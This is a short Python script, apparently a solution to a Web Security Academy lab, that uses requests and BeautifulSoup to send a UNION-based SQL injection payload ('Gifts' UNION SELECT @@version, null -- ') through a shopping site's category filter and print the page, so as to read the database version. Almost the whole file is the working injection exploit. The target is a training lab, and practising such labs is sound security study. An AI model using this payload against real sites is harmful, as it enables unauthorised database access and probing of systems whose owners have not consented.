import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac1a1f2c1fab04acc0feafa2002a0088.web-security-academy.net'
url = f'https://{site}'

resp = s.get(url)

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text,'html.parser')
    print(soup)

try_category("""Gifts' UNION SELECT @@version, null -- """)